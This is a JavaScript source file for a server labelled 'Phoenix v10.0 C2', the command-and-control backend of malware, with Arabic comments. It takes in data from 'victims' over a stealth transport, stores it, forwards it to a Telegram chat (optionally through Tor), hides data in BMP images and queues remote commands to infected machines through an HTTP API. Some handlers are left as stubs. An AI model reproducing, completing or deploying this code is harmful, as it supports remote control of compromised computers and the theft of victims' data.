// ===================================================================
// Phoenix v10.0 - C2 Server (Production Ready)
// ===================================================================
const express = require('express');
const WebSocket = require('ws');
const cors = require('cors');
const dotenv = require('dotenv');
const { loadOrGenerateKeys, shouldRenewKeys, renewKeys } = require('./keys-manager');
const TelegramSender = require('./telegram-sender');
const StealthTransport = require('./stealth-transport');
const { saveVictimData, hideDataInBMP } = require('./storage');
const { processCommand } = require('./commands');
const { startTor, getTorAgent } = require('./tor-helper');

dotenv.config();

// ===================================================================
// CONFIGURATION
// ===================================================================
const CONFIG = {
    WS_PORT: parseInt(process.env.WS_PORT) || 8080,
    HTTP_PORT: parseInt(process.env.HTTP_PORT) || 8081,
    TELEGRAM_TOKEN: process.env.TELEGRAM_TOKEN,
    TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID,
    STORAGE_PATH: process.env.STORAGE_PATH || './data',
    TOR_ENABLED: process.env.TOR_ENABLED === 'true',
    CHUNK_SIZE: parseInt(process.env.TELEGRAM_CHUNK_SIZE) || 1.5 * 1024 * 1024 * 1024,
};

// ===================================================================
// KEYS
// ===================================================================
let { publicKey, privateKey, generatedAt } = loadOrGenerateKeys();

// تجديد المفاتيح كل 30 يوماً
setInterval(() => {
    if (shouldRenewKeys(generatedAt)) {
        const newKeys = renewKeys();
        publicKey = newKeys.publicKey;
        privateKey = newKeys.privateKey;
        generatedAt = newKeys.generatedAt;
        console.log('[+] Keys renewed successfully.');
    }
}, 24 * 60 * 60 * 1000);

// ===================================================================
// TELEGRAM SENDER
// ===================================================================
const telegram = new TelegramSender(
    CONFIG.TELEGRAM_TOKEN,
    CONFIG.TELEGRAM_CHAT_ID,
    {
        useTor: CONFIG.TOR_ENABLED,
        chunkSize: CONFIG.CHUNK_SIZE,
        retries: 3,
        retryDelay: 5000,
    }
);

// ===================================================================
// STEALTH TRANSPORT (SSE + HTTP/2)
// ===================================================================
const transport = new StealthTransport();
transport.events.on('data', async ({ victimId, data, type }) => {
    // معالجة البيانات (تخزين، إرسال إلى Telegram، إلخ)
    const filePath = saveVictimData(victimId, data, type);
    try {
        await telegram.sendFile(filePath, `${victimId}_${Date.now()}.bin`, `📦 Data from ${victimId}`);
    } catch (error) {
        console.error('[!] Telegram error:', error.message);
    }
});

// ===================================================================
// HTTP SERVER (مع واجهة API)
// ===================================================================
const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));

// نقاط النهاية
app.get('/', (req, res) => res.send('Phoenix v10.0 C2 Server'));
app.get('/api/victims', (req, res) => {
    // إرجاع قائمة الضحايا (من قاعدة البيانات)
    res.json({ victims: [] });
});
app.post('/api/command', async (req, res) => {
    const { victimId, command } = req.body;
    if (!victimId || !command) return res.status(400).json({ error: 'Missing params' });
    await processCommand(victimId, command);
    res.json({ status: 'queued' });
});
app.post('/api/send-to-telegram', async (req, res) => {
    const { victimId } = req.body;
    // إرسال جميع ملفات الضحية إلى Telegram
    // ...
    res.json({ status: 'sent' });
});

app.listen(CONFIG.HTTP_PORT, () => {
    console.log(`[+] HTTP server on port ${CONFIG.HTTP_PORT}`);
});

// ===================================================================
// WEBSOCKET SERVER (للتواصل مع الضحايا)
// ===================================================================
const wss = new WebSocket.Server({ port: CONFIG.WS_PORT });
console.log(`[+] WebSocket server on port ${CONFIG.WS_PORT}`);

wss.on('connection', (ws) => {
    // ... (نفس الكود السابق مع تحسينات التشفير والتقسيم)
});

// ===================================================================
// TOR START
// ===================================================================
if (CONFIG.TOR_ENABLED) {
    startTor();
      }
